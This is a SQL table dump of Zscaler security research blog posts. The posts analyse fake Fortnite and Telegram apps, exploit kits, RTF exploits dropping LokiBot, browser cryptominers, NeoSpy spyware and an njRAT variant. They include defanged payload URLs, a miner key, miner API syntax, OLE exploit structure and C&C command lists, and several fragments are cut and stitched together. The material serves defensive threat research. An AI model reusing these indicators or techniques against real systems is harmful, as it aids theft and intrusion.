name, as shown below.                                                                                    Fig1: Icon    Upon installation, the spyware begins harvesting call logs, including outgoing and incoming calls, missed calls, and phone contacts. The malware is able to make calls as well.                                                                                    Fig 2: Harvesting call logs                                                                                 Fig 3: Accessing Contacts                                                                               Fig 4: Making Calls    It can also send SMS and harvest SMS logs:                                                                             Fig 5: Harvesting SMS                                                                               Fig 6: Sending SMS    We observed a prompt for allowing Accessibility services from this spyware, which can allow it to do certain privileged operations without the user\'s interaction (although it is not implemented as efficiently as examples we’ve seen in banking malware and ransomware, in which devices are completely locked until access is enabled).                                                                     Fig 7: Usage of accessibility functionality    Along with all the harvesting, the spyware can carry out the following operations:      	Accessing camera and taking pictures  	Wiping device data  	Accessing accounts  	Reading keystrokes  	Accessing file manager  	Recording audio      This spyware creates a \"files\" folder under its installation directory. Under that directory it writes all logs on a daily basis. Files and harvested data can be observed in the following screen shot. Along with the data, key logging activity is visible in the screenshot, where the spyware is reading keystroke by keystroke and storing the data to file.                                                                       Fig 8: Logging data into files    The following screenshot shows harvested call logs.                                                                   Fig 9: Call logs harvesting    We have not yet seen any connection made by this spyware to its command-and-control (C&C) servers. This may indicate that the spyware is still under development. We have observed some strings in the payload that appear to be connected to the Spynote RAT builder, and it is possible that this malware was built with it.    Fake Fortnite game - Coin Miner    In another incident, we observed the coin miner payload being spread as the fake Fortnite game.    URL:hxxps://cdn[.]androidapk[.]world/downloads/com[.]fortnite[.]apk    The domain androidapk[.]world is well-known for hosting Android coin mining apps, and it now has a coin miner app disguised as a fake Fortnite game as seen below.                                                                          Fig 10: Site serving coin mining apps.    This malware has CoinHive JavaScript embedded in the file named as “engine.html” in the asset folder of an Android package, as shown in the following screenshot.                                                                            Fig 11: CoinHive JavaScript    Coin mining activity is started by calling the “engine.html” file from the asset folder in the code. See screenshot below.                                                                               Fig 12:  Initiating mining    As shown above, the code is triggering the HTML file containing the CoinHive framework for initiating mining.    We monitored the app on a device and found that this coin mining app significantly raises CPU usage once installed. See the following screens that show usage before installation and after installation.                                                                                                                                                  Fig 13: Before installation                                                                              Fig 14: After installation    We have not noticed any disclaimer notifying the user that the device will be used for coin mining activities. As coin mining activity uses CPUs and GPUs, it will drain a mobile device’s battery and may slow down the infected device.    Fake Fortnite game - revenue generation/app promotion campaigns:    Along with spyware and coin mining apps, we observe some of the domains promoting the release of the Fortnite game on Android and serving unwanted apps showing ads and generating revenue for authors.    The following are the domains:      	androidfortniteapk[.]com  	betafortnite[.]com  	officialandroidfortnite[.]com/androidfencpiandroid/      Fake Fortnite game virtual currency app (V-Bucks) on Google Play    We also came across an app on Google Play that claimed to help Fortnite players earn free V-Bucks but in reality was a complete scam.                                                                                  Fig 15: Sites serving the fake Fortnite game    Once installed, the app show the fake Fortnite Battle Royal V-Bucks generator screen as seen below.                                                                               Fig 16: Fake screen for V-Bucks      The app asks users to leave suggested promotional comments and a 5-star rating on the app’s Google Play store page, as shown below.                                                                                 Fig17: Fake screen for V-Bucks    Interestingly, to avoid making users suspicous, the app will offer random promotional comments from it’s comment list stored in the website code. Observe here:                                                                              Fig18: Fake comments    The same comments can be observed on the Play Store page as well.                                                                          Fig19: Fake comments on Google Play store    Such positive comments will definitely lure more victims and earn more revenue for the app developer.    The app then asks users to the provide numbers of the vbucks needed to be generated. Upon clicking the generate button it will provide prompts for the human verification screen, which will lead to the downloading of more apps and surveys, as shown here.                                                                                  Fig 20: Fake survey    After completing the survey and downloading the suggested apps, the user doesn\'t receive free V-Bucks, but the app author definitely generates real revenue. This fake app was downloaded over 5 thousand times and has been rated five stars over four thousand times, before we reached out to Google Security team who promptly removed the app.    Along with this fake app, we observed fake domain names registered to disguise another fake release of the Fortnite game on the Android paltform.     Following are these domains:      	androidfortniteapk[.]com  	betafortnite[.]com  	officialandroidfortnite[.]com/androidfencpiandroid/                                                                               Fig 21: Sites serving fake Fortnite game    Once installed, these apps show a fake Fortnite game playing screen which is pretty neat and actually look like the official game along with the game’s music.                                                                              Fig 22: Icons                                                                            Fig 23: Fake Fortnite gaming screens.    Once a user clicks on the screen, the app asks for mobile verification and redirects to a browser asking the user to fill out the survey. This leads to the downloading of other apps which will generate revenue for the app developer as shown below.                                                          Fig 24: App promotion for revenue generation    Conclusion:    There is no official news from Epic games about the release of the Fortnite game on the Android platform. Users should beware of malware authors looking to exploit their desire to play Fortnite on Android. We urge users to download games only from authorized and legitimate sources, such as Google Play.    To avoid becoming a victim of such malware, it is a good practice to uncheck the \"Unknown Sources\" option under the \"Security\" settings of your device. This will prevent you from inadvertently downloading fake apps, which are sometimes convincing in their design. Additionally, users should also check comments and rating of the app even when downloading them from Google Play store.    If a user becomes aware that there is spyware on their phone, here are the steps they should perform for remediation:      	Step 1. Disable Accessibility access for Fortnite app: Settings -> Accessibility -> Fortnite (App name) -> Turn off access  	Step 2. Remove the Fortnite app: Settings -> Apps -> click on Fortnite icon -> Uninstall.      Zscaler ThreatLabZ is actively monitoring fake apps posing as the Fortnite game, and others, to ensure that Zscaler customers are protected.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/fake-fortnite-apps-scamming-and-spying-android-gamers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (31, 'Top Exploit Kit Activity Roundup – Spring 2018', 'Rohit Hegde', 'May 11, 2018', 'Overview    This is the eighth in a series of blogs by the Zscaler ThreatLabZ research team collecting and analyzing the recent activity of the top exploit kits. Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers and deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors. What follows are highlights from the EK activity we observed during the last quarter.         RIG Exploit Kit    RIG EK has been the most active exploit kit, but its activity has decreased in comparison with previous quarters. We can see minimal RIG EK activity in the month of January, but it picked up again in the second half of April. We are seeing different payloads delivered by RIG this quarter, and they varied from ransomware and banking Trojans to crypto mining software—as opposed to its more typical payload of Cerber ransomware. Below we can see the hits for RIG EK activity.        Fig 1: RIG EK Hits from 1st Jan 2018 to 30th April 2018.    The geographical distribution of the hits is shown below.        Fig 2: RIG EK Heat Map showing infected regions.    Most infection attempts are seen in the United States, Spain, and Switzerland this quarter, while last quarter, activity was only observed in the United States and Russia.     The most common RIG EK redirects were observed from illegal streaming websites, which provide users with free, live sports feeds. The malvertising on these websites fingerprints a user\'s machine, as per the attacker\'s configuration on the Traffic Distribution Systems; the most recently active one is Black TDS. An example of such a streaming domain is nba-stream[.]online, which sends users to malvertising domains like www.ligtv-izle[.]net/ads/ad2.html. The RIG EK cycle that follows is shown below.        Fig 3: RIG EK Infection cycle.    There were common patterns observed in the RIG EK landing page URLs, which would change on weekly basis, but the landing page content has remained mostly unchanged.        Fig 4: RIG EK landing page URLs with common parameters.     The obfuscated RIG EK landing page is shown below.        Fig 5: RIG EK Obfuscated landing page.    One significant change is the inclusion of the CVE-2018-4878 Adobe Flash vulnerability, which affects Adobe Flash Version 28.0.0.137 and earlier versions.    When we open the downloaded Flash file using a decompiler, we found the section of the pointer to the listener object, which is responsible for this vulnerability. This is highlighted in the image below.        Fig 6: RIG EK Flash with CVE-2018-4878        Fig 7: RIG EK Flash with CVE-2018-4878    We saw the RIG EK downloading GandCrab ransomware instead of the usual Cerber ransomware. Other payloads we saw included cryptocurrency miners, along with Trojans like Bunitu and Ramnit.         GrandSoft Exploit Kit    GrandSoft Exploit Kit is an old exploit kit that has become active again. This EK consists of simple JavaScript redirects without any obfuscation. The landing page was seen serving CVE-2016-0189, which is a scripting engine memory corruption vulnerability.     The GrandSoft EK activity hits are shown below.        Fig 8: Grandsoft EK Hits from 1st Jan 2018 to 30th April 2018    The geographical distribution of the hits can be seen below.        Fig 9: Grandsoft EK Heat map showing infected regions.    GrandSoft EK redirects were seen from malvertising chains and the hits are distributed globally. The EK does not seem to be targeting any specific geographic region.     The GrandSoft EK cycle can be seen below.        Fig 10: Grandsoft EK cycle    We see that the gate contains a simple JavaScript redirect, as shown below.        Fig 11: GrandSoft EK Javascript Redirect    This call loads another JavaScript-based redirect to the landing page.        Fig 12: Grandsoft EK Landing page redirect    The landing page snippet with the CVE-2016-0189 code is shown below.        Fig 13: Grandsoft EK Landing page with CVE-2016-0189    The payload seen in this cycle was GandCrab ransomware; this can be seen in the temp directory of the infected machine.        Fig 14: Grandsoft EK downloads GandCrab ransomware to the victim machine.         Other exploit kits    Magnitude EK activity was observed this quarter, but it was targeted in South Korea. The EKs that were showing reduced activity in the last quarter, such as Terror EK, Disdain EK, and Kaixin EK, are no longer showing any activity.         Conclusion    Exploit kits are effective, as they can infect a victim\'s machine during web browsing without the user\'s knowledge. The attackers monetize the successful infections by collecting a ransom for retrieving data encrypted by ransomware, mining cryptocurrencies using the victim\'s system resources, or installing banking Trojans to steal a victim\'s identity. Attackers frequently change their techniques by obfuscating the source code or integrating new exploit code into their EK, and security researchers analyze and block the new threats by tracking changes in the EK behavior.      To help avoid infections from exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Keeping the browser plugins and web browsers up to date with latest patches helps to protect against common vulnerabilities targeted by exploit kits. The Zscaler ThreatLabZ research team has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler cloud security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-spring-2018');

In reviewing activities around this matter, Zscaler ThreatLabZ researchers noticed a fake Telegram app making the rounds in the Google Play Store. Zscaler informed Google about the fake app and it was promptly removed from the store.     Because Telegram is partially open-source, we initially thought this fake Telegram app was a regular app implementing Telegram APIs. However, upon further analysis, we found that the fake app had been repackaged, in which case it is possible that a developer simply decompiled the original Telegram app and added advertisement libraries. We also noticed that the name and icon of the fake app changes after installation. Our analysis is detailed below.     App Details     Name: Telegraph Chat (which changes to Teleg\'e\'ram after installation)   Package Name: com.telegeram.anydev  Hash: 1f188831ec559566f8746e5e57bb1fcbb0f30ead  VT count: 2/62 (at time of analysis)     The screenshot below shows the fake Telegram app (left) and the original Telegram app (right). The fake app portrayed itself as Telegraph Chat and the Play Store description of the app was precisely the same as the original Telegram app. The only differences were that the term Telegram was changed to Telegraph Chat and the app icon was slightly altered after installation.

We tried calling to other numbers, which is a functionality in the original Telegram, but the fake app stopped working, as shown in the message below:      	  		  			  		  		  			Fig 5: Fake app fail.  		  	        Conclusion    Telegram is a popular app with 200 million users, according to its own reports. But with the confusion brought about the actions of the Russian government, bad actors have seized an opportunity to present an app that may trick users searching for Telegram into downloading a malcious app. This technique is often used when an app is popular (see Pokemon GO) or, in this case, in the news.    Fake versions of popular apps are an ongoing problem, and once such an app has been downloaded on a mobile device, it is easy for the developer to open a gateway for more downloads and installation of malware.     Users should always take appropriate precautions before installing any app, even in trusted stores like Google Play or Apple App Store. One effective precaution is to read other users’ reviews before installation.                	  		  			  		  		  			Fig 6: Google Play reviews for fake Telegram app  		  	           ThreatLabZ will continue to track and ensure coverage for fake Android apps to protect Zscaler customers.', '', 'https://www.zscaler.com/blogs/research/fake-telegeram-google-play');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (33, 'CVE-2017-8570 and CVE-2018-0802 exploits being used to spread LokiBot', 'Mohd Sadique', 'April 26, 2018', 'Zscaler ThreatLabZ has been tracking the usage of malicious RTF documents that leverage CVE-2017-8570 and more recently CVE-2018-0802 vulnerability exploits to install malicious payload on the victim machine. In this blog, we\'ll share our analysis of a campaign leveraging these two exploits to deliver LokiBot.    These malicious documents spread by using phishing emails to trick users into opening and executing them.        Fig 1: Malicious documents weaponized with exploits to infect target machine    An example of a phishing spam email with an attached malicious RTF document is shown below.        Fig 2: Phishing spam email with attached malicious RTF document    In case of the LokiBot spreading campaign we saw that these documents were either weaponised with CVE-2017-8570 or CVE-2018-0802 exploit paylods.    The workflow of both exploits is shown in the below.        Fig 3: Workflow of CVE-2017-8570 and CVE-2018-0802    CVE-2017-8570    This exploit bypasses the Microsoft patch for CVE-2017-0199. It makes use of a composite moniker in the RTF file to execute a Windows Script Component (WSC) file or scriptlet on the victim’s machine. A scriptlet is a XML file wrapping a script like VBScript, JavaScript, etc.    The RTF document uses a Packager.dll trick to drop an SCT file into the %TEMP% directory and execute it using the escalated privilege that the vulnerability provides.    The document has two objdata encoded and embedded in it, as shown below.        Fig 4: Objdata1 “Package” ActiveX control    01050000 02000000 = OLE object  08000000 = Length of following string  5061636B 61676500 = ActiveX name “Package”  CB060000 = Data length of following binary data    Upon executing the RTF file, the embedded SCT file is dropped in the %TEMP% directory with the name V2BRUIICCL75CPT.sct.  This SCT file will be executed by a second objdata in the RTF document.        Fig 5 : Objdata2 “OLE2Link” leveraging composite moniker    The RTF has a composite moniker, file moniker, and new moniker working together.  The byte sequences shown in the Fig 5 are the binary representation of following CLSID.  {00000309-0000-0000-C000-000000000046} = Composite moniker  {00000303-0000-0000-C000-000000000046} = File moniker  {ECABAFC6-7F19-11D2-978E-0000F8757E2A} = New moniker      After the file moniker CLSID, there is a length field followed by the file path, which is going to execute the new object persisted in “%TMP%\\V2BRUIICCL75CPT.sct”.  In short, this object will execute the file by using composite moniker in the RTF document.    The dropped SCT file looks like the screen capture below.        Fig 6: %TEMP%\\\\V2BRUIICCL75CPT.sct    This SCT file is dropped and executed by the RTF document. The SCT file has JavaScript, which downloads malicious executable price.exe from juanjoseriffo[.]com/ed/price.exe, saves it to %APPDATA% with name windowsis.exe, and executes it.    CVE-2018-0802:    This exploit is a CVE-2017-11882 patch bypass vulnerability of type stack overflow.  This vulnerability will only work on systems updated with CVE-2017-1182 patch.    The logic behind this loophole is similar to the remote code execution vulnerability (CVE-2017-11882) using office embedded formula editor EQNEDT32.EXE.         Fig 7: RTF file exploiting CVE-2018-0802    The first object data of the document file is using Packager.dll to drop the file into the %TEMP% directory. The malicious executable file, having the length 0x000868B6, will be dropped in the %TEMP% directory with the name price.exe.    Like CVE-2017-11882, the actual data for this vulnerability is in the equation native stream of the OLE object, which is shown in the below image.        Fig 8: Equation native stream of OLE object in RTF document    The dropped file %temp%\\price.exe will be executed via the Microsoft Windows command shell.     LokiBot:    The malicious executables dropped by the RTF documents, leveraging the above two exploits, are from LokiBot family. LokiBot is a malware capable of stealing user\'s private data including stored credentials and cryptocurrency wallets. The stolen information is relayed back to the Command & Control (C&C) server. The LokiBot malware payloads seen in this campaign were compiled using Borland Delphi and were UPX packed.    Upon execution, the malware copies itself to the startup folder at “%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.” to ensure persistence on system reboot.    After that, the sample reads the machine GUID from the registry key HKEY_LOCAL_MACHINE\\SORTWARE\\Microsoft\\Cryptograpy\\MachineGuid using RegOpenKeyEx and RegQueryValueEx Functions.        Fig 9: Obtaining machine GUID    Once the machine GUID is obtained from the registry, LokiBot calculates the MD5 hash of the machine GUID by calling CryptAcquireContext, CryptCreateHash, CryptHashData, and CryptGetHashParam APIs.    The sample trims the MD5 hash of the machine GUID to 24-charachters and creates a mutex with this name as seen below.        Fig 10: Mutex creation    The purpose of mutex is to ensure that only one payload of LokiBot is running on the infected system.    Information Stealing module    Once installed, Lokibot is capable of stealing stored credentials and other private information from the following applications:      	Mozilla Firefox  	Opera  	Apple Safari  	Internet Explorer  	Google Chrome  	Chromium  	Easy FTP  	DeluxeFTP  	WinSCP  	Outlook  	CheckMail  	Filezilla  	NetDrive  	myFTP  	Putty  	360 Browser  	KeePass, and more      LokiBot creates a hidden directory in %APPDATA% where the directory name is string extracted from 8th through 13th characters of the Mutex name. It creates four files in the hidden directory at the running time, all of which are named using string extracted from 13th through 18th characters of the Mutex name.        Fig 11: Files created by LokiBot    File descriptions:  .exe - Copy of malware that will execute every time when user logs in  .hdb - Database of hashes of data that has been sent to C&C server  .kdb - Keylogger data that has to be sent to C&C server  .lck - Lock file created to prevent resource conflicts    After all the target applications have been profiled for stored credentials, LokiBot prepares harvested data and sends it to the C&C server.        Fig 12: POST request to C&C server        Fig 13: First data sent to C2 server    The information transmitted by LokiBot contains system information, application data, Windows credentials, cryptocurrency wallet, keylogger data, screenshots etc. It will send a request every 10 minutes to the C&C server requesting C&C commands, and the malware acts in accordance with the C&C commands.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (34, 'Cryptomining is here to stay in the enterprise', 'Deepen Desai,', 'April 10, 2018', 'After Bitcoin hit highs above $19,000 in December, cryptocurrency has received even more attention as speculation about the currency continues.  It should be no surprise then that there has been a rise in cryptomining activity. Cryptomining is “the process by which transactions are verified and added to the public ledger, known as the block chain, and also the means through which new bitcoin are released.  Anyone with access to the internet and suitable hardware can participate in mining.” Source: Investopedia     But it is also possible to mine cryptocurrency without running a dedicated application on a computer that you access or control. Web-based methods allow website operators to use scripts to mine cryptocurrency within a browser, using the resources of the website visitor. We reported on the rise of this in our October 2017 blog, where our Zscaler ThreatlabZ research revealed the sudden interest and growth in web-based monetization towards coin mining.    As we have continued to monitor the trend in 2018, the volume of cryptomining transactions has grown. In the last six months we have blocked more than 2.5 billion cryptomining attempts.  We’ve been actively monitoring the trend and believe this can be explained by the following developments:      	Given the sharp increase in value of cryptocurrency, legitimate sites are adopting cryptomining as a source of revenue over online advertisement. These sites will offer visitors a choice between seeing ads or being mined in order to view the site content.  	Cybercriminals are also taking advantage of this trend by injecting JavaScript code into compromised legitimate sites to conduct cryptomining activities unbeknownst to site owners and visitors.  	In some cases, malicious advertisements are being leveraged for browser-based cryptomining activities.      Enterprise networks are being impacted in various ways. Unwanted and unidentified mining activity inside networks causes increased wear and tear on corporate hardware, as the mining increases CPU cycles. Mining activity also hogs corporate network bandwidth and causes performance issues.    In this blog, we will cover the trends and technical details of the top five cryptominers based on the volume of transactions we are seeing along with recent statistics.    In the last six months, Zscaler successfully detected and prevented approximately 2.5 billion web-based coin-mining attempts in the Zscaler cloud. The following is graphical representation of coin-mining attempts, showing CoinHive as the most active cryptominer service, which is not all that surprising when you consider that CoinHive was first to commercially launch a browser-based cryptomining service in September 2017.        Fig. 1 - Cryptomining attempts by top-performing cryptomining service types between October 2017 to March 2018    Zscaler ThreatLabZ observed an increase in cryptomining among the top 100,000 sites globally according to ranking by Alexa. The following is a breakdown by category of close to 500 of Alexa top 100K domains with embedded cryptomining web service that were not involved in serving any other malicious content.        Fig. 2 - Category distribution of Alexa top 100k sites with embedded cryptomining    As you can see, the category of domains that were used most for browser-based mining activity include nudity/pornography followed by streaming media. The average browsing time for users on video streaming sites tends to be higher allowing miners to maximize their activity as users stay on these sites to view movies or play games. Note that the professional services and marketing category sites ranked high as well, demonstrating the prevelance of mining activity on corporate networks.      This new web-mining trend has attracted a few more crypto-miner players into the market. Zscaler has successfully blocked all mining attempts from these new players and continues to actively track their activities. That said, we are certain that there will continue to be new players that will garner more market share.    New crypto-miners:      	Project-Poi  	Coin-blind  	Coin-nebula  	Coin-Have  	Coin-Imp      We will share new trends in web-based crypto-miners through regular updates. Now, let’s jump into the technical details to see what\'s going on under the hood.    Basics on web-based coin-miner:    The following image shows  typical coin-mining activity, where the user visits a site that has been embedded with mining JavaScript, and this, in turn, redirects the user to the coin-miner web service and starts churning the user’s CPU cycles.        Fig. 3 - Browser-based cryptomining activity workflow    Technical details of the top 5 cryptominers:    CoinHive:    As previously mentioned, CoinHive dominates the cryptominer market and represents a whopping majority of cryptominers in the enterprise traffic seen on the Zscaler cloud, and with the fastest growth. In the process of tracking this miner, we have noticed that the embedding of CoinHive in websites has evolved over time. We saw numerous compromised sites using JavaScript obfuscation and final code masquerading as Google analytics JS code to viewers.    The following screen capture shows obfuscated Coin-Hive JavaScript.        Fig. 4 - Obfuscated CoinHive JavaScript    The decoded version of the above script clearly shows the CoinHive JavaScript.         Fig. 5 - De-obfuscated CoinHive JavaScript    The de-obfuscated code contains a non-dotted decimal IP address, which translates to 185.209.23.219 and miner key NPRak9QU4lFBSneFt23qEIChh5r0SZev.    The following is a Fiddler (web debugging software) capture of CoinHive transactions:             Crypto-Loot:    This web-based miner has gained some popularity among attackers and malicious website owners. We expect to see a significant rise in the use of Crypto-Loot in the near future. This is partly due to this miner’s price. It has a 12% service charge, which is very low compared to the 30% charged by CoinHive, and is likely to boost Crypto-Loot’s adoption.    The following screenshot shows the Crypto-Loot API embedded in JavaScript.         Fig. 6 - Crypto-Loot API embedded in JavaScript    In the following Fiddler image, we can see that texas-register[.]com redirects to crypto-loot.com to initiate mining activity.        Fig. 7 - Redirection to Crypto-Loot    JSE-Coin:    Technically, this crypto-miner differs from other miners, though it does have a similar approach to Google AdSense and other analytical or advertisement platforms, where a webmaster embeds an external JavaScript file into a website.    But in the case of JSE-Coin, a site using JSE mining has a separate, independent JavaScript hosted on its server. We can see the JSE-Coin embedded in freefansitehosting[.]com in the following image.        Fig. 8 - JSE-Coin embedded in the website’s server         The following Fiddler screen shows the transaction in which the affected website leads the visitor to jsecoin[.]com to kickoff coin mining activity.        Fig. 9 - Leading the user from one website to the JSE-Coin site    DeepMiner:    DeepMiner is a free, open-source JavaScript library for mining XMR (Monero) or ETN (Electroneum) cryptocurrency. This library can be embedded in a website, as shown below.        Fig. 10 - DeepMiner embedded in website    The following are Fiddler transactions of a website that has embedded DeepMiner.        Fig. 11 - Transactions that move the user to DeepMiner for cryptomining    Minr:    Currently, Minr has a pretty thin adoption compared to other crypto-miners. To embed Minr in the website, the developer provides the API. The following is the API syntax:      	www.miner-host.com/js/GENERATED_KEY.js?trl=0.5&sc=false  	  		Trl : Throttle of worker (CPU usage)  		sc : Referer check  	  	      The following domains are involved in the Minr cryptomining service:      	minr.pw  	web.clod.pw  	cdn.static-cnt.bid  	web.dle-news.pw  	ad.g-content.bid  	cloudcdn.gdn  	cdn.rove.cl  	static.hk.rs            Let’s look at a sample to explain Minr in more detail. In the following infection, eldiariodetandil[.]com is a domain that has Minr embedded, where static-cnt[.]bid is used as a Minr web-service, and the random capital letters in part of the URL are an API key.        Fig. 12 - Site embedded with Minr    Recently, we have observed that attackers are using JavaScript obfuscation to evade static detection of a Minr mining attempt. The following screenshot shows a heavily obfuscated Minr script within patsitalian[.]com.         Fig. 13 - Obfuscated Minr script    The de-obfuscated content is shown below.         Fig. 14 - De-obfuscated Minr content    Cryptomining activity around the world:    Cryptomining activity is taking place worldwide, but the U.S. leads in both, cryptomining users and in the hosting of servers that are involved in mining activity. In fact, U.S. numbers in both categories are more than double that of the next country on the list. As you can see in the map below, all the users in Europe combined still amount to fewer users than those in the U.S., and the number of servers in the U.S. are more than twice that of the number in Russia.        Fig. 15 - One month sample of the top 10 countries with cryptomining users and servers    Conclusion:    It is clear that cryptomining is not going away and that it is increasing exponentially in popularity. However, the practice, whether done with permission or not, raises many questions, particularly in ethical terms and compliance requirements and practices. Corporations that unknowingly have cryptomining activities taking place on their networks may be at risk of compliance violations in that there is unidentified action taking place on company systems.  There are also ethical questions, such as whether or not site owners that have granted permission for their site to be cryptomined are responsible for notifying and educating site visitors on how their systems will be affected by this activity. Regardless, both enterprises and consumers suffer the same effects of cryptomining, including added CPU cycles, increased power use, and hardware erosion.    There is also an elevated risk of exposure to malware due to the use of JavaScript by many of these cryptominers. Once injected into a site, JavaScript code can be easily manipulated by a cybercriminal for other uses, exposing consumers and employees in enterprises to other harmful attacks.     As is the case with many new technologies, we are in limbo when it comes to regulation and disclosure requirements for cryptomining. However, one small city has taken the first step in regulation. Plattsburgh, New York, has banned cryptomining for 18 months in an effort to stop the enormous energy usage the practice takes. We will most likely see more cities and states follow suit.    Attackers always aspire for quick and easy ways to generate revenue, and in-browser coin-mining is lucrative and less intrusive to the victim. To protect yourself, there are a few things you should do to avoid in-browser coin-mining activities like the ones we’ve discussed here.      	Watch out for a sudden spike in memory use that causes the PC to become slow  	Disable JavaScript in your browser and enable it only when visiting trusted websites  	Block the aforementioned coin-mining domains      Zscaler ThreatlabZ is actively tracking various web based mining services and ensuring coverage for it under Cryptomining threat category.', '', 'https://www.zscaler.com/blogs/research/cryptomining-here-stay-enterprise');

Users often download such apps for little to no cost and for innocent reasons, such as monitoring their children’s activity on mobile devices. However, what happens when the app is malicious and instead spies on the original user and the environments that user is in? In the BYOD enterprise environment, this can spell trouble for corporate networks.    During the course of daily malicious app tracking activity, the Zscaler ThreatlabZ team came across multiple commercial Android spyware programs. These malicious apps were proactively flagged by Zscaler cloud sandbox as seen below:      	  		  			  		  		  			Fig 1: Zscaler Sandbox  		  	           Technical Details:    Name : NeoSpy  Package : nam.atapp.module  MD5 : 8e7fa22f043ec664cf482b7b7092b3d9    Upon installation, the spyware displays its icon, named NeoSpy Mobile, which, upon clicking, asks the user to register or login.      	  		  			  		  		  			Fig 2: App Installation & Registration  		  	           For a new registration, it asks for login name, login email, and password. These details were being sent to the server in plain text over HTTP, as can be seen in the screenshot below. Anyone sniffing the network can get these details, which opens another attack vector—but that\'s a completely different story.       	  		  			  		  		  			Fig 3: Registration Request  		  	        Once registration is successful, the spyware asks for features to be enabled/disabled on the victim\'s device. Features include:      	Intercepting SMS  	Intercepting calls  	Enabling keylogger (To steal anything typed by victim, especially passwords)   	Stealing GPS coordinates of victim  	Online status of victim  	Stealing photos  	Frequency for sending GPS coordinates (5 minutes/1 hour/never)        	  		  			  		  		  			Fig 4: Enabling spying features  		  	        As soon as basic setup is done, the app icon is immediately hidden from the mobile device. Soon after, the server responds with the location where victim\'s data will be sent. The screenshot below shows the request/response:       	  		  			  		  		  			Fig 5: Server response with destination IP  		  	        As soon as the destination address is received, NeoSpy starts its services and continuously hunts for incoming SMS messages and phone calls, and sends them over to the IP address specified by NeoSpy server. Over the course of the spyware life cycle, the victim remains totally unaware. The screenshot below shows stolen data being sent.      	  		  			  		  		  			Fig 6: Stolen data sent to attacker  		  	        On the other side, the attacker simply needs to log in to the NeoSpy dashboard, which displays the number of devices infected, as shown in the below screenshot:      	  		  			  		  		  			Fig 7: Attacker\'s dashboard  		  	      We ran the spyware in a controlled environment where the virtual Android device was made to receive an SMS message and call. The spyware successfully intercepted the data and relayed it to the server. Both the details along with location of the device are visible on the dashboard, as shown in the above screenshot.     During our analysis, we also found a variant of this spyware available on Google Play Store with installs between 10,000 and 50,000. Zscaler ThreatlabZ contacted Google’s android security team and the app was promptly removed from the Google Play Store. Such spyware uses false/misleading advertising tactics to lure Google Play Store users. SMS spyware programs portray themselves as parental control apps, and location stealers portray themselves as phone tracking devices. In this case, NeoSpy portrayed itself as an anti-theft app with a description as follows:     \"This is an effective phone monitoring module that allows you to find a lost phone or tablet using the geographical coordinates sent to your account. Also you will be able to monitor your child, check where he is, and with whom he communicates, protect him from unwanted acquaintances. All data sent to your personal account is securely protected (AES-128 encryption).\"    The screenshot below shows this spyware app on Google Play Store before it was removed:      	  		  			  		  		  			  			Fig 8: NeoSpy on Google Play Store  			  		  	        Conclusion:    The use of Android spyware apps has become fairly common, but with corporate BYOD (Bring-Your-Own-Device) policies, their use can become devastating as employees bring devices loaded with the spyware and connect them to the company\'s network. It\'s possible that an infected device on a corporate network could leak sensitive information to an attacker. Or, imagine the presence of a spyware app on a government and defense personnel’s mobile device that could then leak not only private call details, but also locations and photos that may contain highly sensitive information.     In most cases, an attacker needs physical access to the device to set up such spyware properly. It is therefore advisable to deploy password-protected measures like pattern lock or pin lock on mobile devices.     While further examining the Zscaler cloud, we found an increased presence of spyware in enterprise networks over the past two months (see details in Appendix A). Zscaler identified this threat as Android.Gen.Spyware.

ARME attack also tries to exhaust the server memory.                 The malware shuts down and restarts the system with the following command:        Switches:    -r -> restart the computer that\'s currently being used    -t -> time, in seconds    -f -> forces running programs to close without warning    We have seen the following C&C commands in the malware:      	C&C Commands  	  		  			delchrm  			Delete chrome cookies and saved logins  		  		  			MonitorOFF  			Turn off monitor  		  		  			TextToSpeech  			Announces text received from C&C using TextToSpeech  		  		  			NormalMouse  			Restores normal mouse button functionality  		  		  			taskmgrON  			Enable task manager  		  		  			ChngWLL  			Change wallpaper  		  		  			Kl  			Keylogger command that checks foreground window and keys pressed  		  		  			Seed  			Sharing, downloading files with torrent software such as BitTorrent and uTorrent  		  		  			ddos.slowloris.start  			Start Slowloris attack  		  		  			RwareSU  			Drop and show ransom note  		  		  			restartme  			Restart the computer  		  		  			DisableCMD  			Disable command prompt  		  		  			EventLogs  			Delete event logs  		  		  			BitcoinOFF  			Stop Bitcoin monitor thread  		  		  			Botk  			Start the botkiller thread  		  		  			pcspecs  			Send system information (CPU/GPU/RAM)  		  		  			Searchwallet  			Check installed bitcoin wallets in the system and send to C&C server  		  		  			PLG  			Load plugin and configure with C&C server  		  	      The malware also has a WORM functionality to spread through USB that enumerates the files and folders on the hard drive. Once it detects the USB drive inserted into the system, it copies itself to the USB drive and creates a shortcut using the folder icon.        Ransomware functionality    The ransomware encrypts files with the extension .lime using the AES-256 symmetric algorithm, which means the key is the same for encryption and decryption.    Ransomware Key generation    When Lime is first launched, it will call a RandomString() function, which will attempt to generate an AES key. It generates a 50-byte array from the input string using a random index, and uses the random() function to fetch one character and stores it to the output string. Lime drops the output string at %AppData%\\\\Microsoft\\\\MMC\\\\hash location.        Upon receiving command, the malware will try to encrypt files in following folders:      	Environment.SpecialFolder.LocalApplicationData  	Environment.SpecialFolder.ApplicationData  	Environment.SpecialFolder.ProgramFiles  	Environment.SpecialFolder.Desktop  	Environment.SpecialFolder.Favorites  	Environment.SpecialFolder.Personal  	Environment.SpecialFolder.MyMusic  	Environment.SpecialFolder.MyPictures  	Environment.SpecialFolder.Recent      The malware also contains function to decrypt all files that are encrypted by Lime ransomware as seen below:        Zscaler ThreatLabZ is actively tracking njRAT variant activities and ensuring Zscaler customers are protected.

